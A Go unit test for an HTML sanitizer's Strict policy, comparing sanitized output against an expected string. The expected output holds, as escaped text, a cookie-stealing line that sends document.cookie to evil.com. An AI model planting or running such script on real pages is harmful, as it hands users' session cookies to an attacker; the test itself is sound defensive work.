package policies_test

import (
	"testing"

	"github.com/empijei/go-html-sanitizer/policies"
	"github.com/empijei/tst"
)

func TestStrict(t *testing.T) {
	tst.Go(t)
	ugcp := policies.Strict()
	got := ugcp.SanitizeString(inMisc)
	want := `This is safe bold text
fetch(&#39;http://evil.com/log?c=&#39; + document.cookie);
Standard cell
Hidden iframe text
Item one with a Bad Link
Item two with an 
Please enter your data: 
Text inside an unknown, unallowed tag.
`
	tst.Is(want, stripWhitespace(got), t)
}
